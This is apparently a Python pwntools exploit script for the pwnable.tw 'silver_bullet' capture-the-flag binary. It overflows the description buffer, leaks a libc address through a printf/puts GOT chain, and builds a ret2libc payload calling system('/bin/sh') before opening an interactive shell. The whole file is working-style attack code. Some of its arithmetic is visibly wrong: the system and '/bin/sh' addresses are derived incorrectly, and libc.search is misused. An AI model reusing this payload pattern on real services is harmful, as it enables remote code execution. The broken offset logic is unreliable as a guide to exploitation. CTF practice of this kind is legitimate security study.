from pwn import *

r = process("./silver_bullet")
#r = remote("chall.pwnable.tw", 10103)
libc = ELF('./libc_32.so.6')
context.arch = "i386"
context.log_level = "error"

def create(desc):
	r.sendlineafter("Your choice :",str(1))
	r.sendlineafter("Give me your description of bullet :",desc)
	print(r.recvline()) #power
	print(r.recvline())

def power(desc):
	r.sendlineafter("Your choice :",str(2))
	r.sendlineafter("Give me your another description of bullet :",desc)
	print(r.recvline()) #power
	print(r.recvline())

def beat():
	r.sendlineafter("Your choice :",str(3))

puts_got = p32(0x0804afdc)
printf_got = p32(0x0804afd4)
main = p32(0x08048954)
printf_inb = p32(0x8048498)
plt = p32(0x80484a8)

#overflowing the buffer passing
create('a'*47)
power('b'*1)

#getting the leaks
payload = '\xff\xff\xff\x01'+ 'c'*3 +printf_inb + main + puts_got
power(payload)
beat()
r.recvuntil("Oh ! You win !!\n")
leak = u32(r.recvline().strip()[:4])
print("tobias")
print(hex(leak))
system = p32(leak -libc.symbols['system'] )
binsh = p32(leak + libc.search['/bin/sh'].next())

#gdb.attach(r, 'b * 0x08048733')
create('a'*47)
power('b'*1)

payload = '\xff\xff\xff\x01'+ 'c'*3 + system+system + binsh + binsh
power(payload)
#beat()



#

#power('c'*75+'d'*16)
#beat()
r.interactive()
